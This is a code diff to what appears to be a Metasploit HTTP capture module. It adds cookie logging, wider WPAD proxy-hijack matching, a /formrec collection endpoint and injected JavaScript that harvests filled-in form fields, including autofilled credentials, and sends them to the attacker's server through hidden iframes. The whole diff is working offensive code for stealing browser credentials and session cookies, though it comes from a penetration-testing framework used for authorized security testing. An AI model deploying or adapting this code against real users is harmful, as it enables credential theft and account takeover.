@@ -51,7 +51,11 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 				OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture", 
 						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "sites.txt")
 					]
-				)
+				),
+				OptPath.new('FORMSDIR',   [ false, "The directory containing form snippets (example.com.txt)", 
+						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "forms")
+					]
+				),				
 			], self.class)
 	end
 
@@ -61,6 +65,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	end
 
 	def run
+		@formsdir = datastore['FORMSDIR']
 		@template = datastore['TEMPLATE']
 		@sitelist = datastore['SITELIST']
 		@myhost   = datastore['SRVHOST']
@@ -151,6 +156,15 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 
 
 		cookies = req['Cookie'] || ''
+	
+	
+		if(cookies.length > 0)
+			report_note(
+				:host => cli.peerhost,
+				:type => "http_cookies",
+				:data => hhead + " " + cookies
+			)
+		end
 		
 
 		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
@@ -183,7 +197,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			
 		end
 		
-		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
+		if(req.resource =~ /^\/*wpad.dat|.*\.pac$/i) 
 			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
 			res = 
 				"HTTP/1.1 200 OK\r\n" +
@@ -195,8 +209,45 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			cli.put(res)
 			return
 		end
+	
+	
+		if(req.resource =~ /^\/*formrec\/(.*)/i) 		
+			data = Rex::Text.uri_decode($1).split("\x00").join(", ")
+
+			report_note(
+				:host => cli.peerhost,
+				:type => "http_formdata",
+				:data => hhead + " " + data
+			)
+			
+			res = 
+				"HTTP/1.1 200 OK\r\n" +
+				"Host: #{hhead}\r\n" +
+				"Content-Type: text/html\r\n" +
+				"Content-Length: 0\r\n" +
+				"Connection: Close\r\n\r\n"
+				
+			print_status("HTTP form data received for #{hhead} from #{cli.peerhost} (#{data})")
+			cli.put(res)
+			return
+		end
 		
 		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
+				
+		if(req.resource =~ /^\/*forms.html$/)
+			frm = inject_forms(hhead)
+			res = 
+				"HTTP/1.1 200 OK\r\n" +
+				"Host: #{hhead}\r\n" +
+				"Content-Type: text/html\r\n" +
+				"Content-Length: #{frm.length}\r\n" +
+				"Connection: Close\r\n\r\n#{frm}"
+			cli.put(res)
+			return
+		end
+		
+		
+
 		
 		
 		# The google maps / stocks view on the iPhone
@@ -243,10 +294,6 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
     			   "Content-Type: #{ctype}\r\n" +
     			   "Content-Length: #{data.length}\r\n" +
     			   "Connection: Close\r\n\r\n#{data}"
-
-
-
-
 			cli.put(res)
 			return
 		end
@@ -259,7 +306,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			next if site =~ /^#/
 			site.strip!
 			next if site.length == 0
-			buff << "<img src='http://#{site}/pixel.gif'>"
+			buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
 		end
 
 		if(ua_name == "IE")
@@ -280,6 +327,58 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 
 		cli.put(res)
 		return		
+	
+	end
+	
+	
+	def inject_forms(site)
+
+		form_file = File.join(@formsdir, site.gsub(/(\.\.|\\|\/)/, "") + ".txt")
+		form_data = ""
+		if (File.readable?(form_file))
+			form_data = File.read(form_file)
+		end
+			
+		%|
+<html>
+<head>
+	<script language="javascript">
+		function processForms() {	
+			var i = 0;
+			while(form = document.forms[i]) {
+				
+				res = "";
+				var x = 0;
+				var f = 0;
+				
+				while(e = form.elements[x]) {
+					if (e.name.length > 0 && e.value.length > 0){
+						res += e.name + "=" + e.value + "\x00";
+						f=1;
+					}
+					x++;
+				}
+				
+				if(f) {
+					url = "http://"+document.domain+":#{@myport}/formrec/" + escape(res);
+					fra = document.createElement("iframe");
+					fra.setAttribute("src", url);
+					fra.style.visibility = 'hidden';
+					document.body.appendChild(fra);
+				}
+				
+				i++;
+			}
+		}
+	</script>
+</head>
+<body onload="processForms()">
+
+#{form_data}
+
+</body>
+</html>
+|	
 	
 	end
 
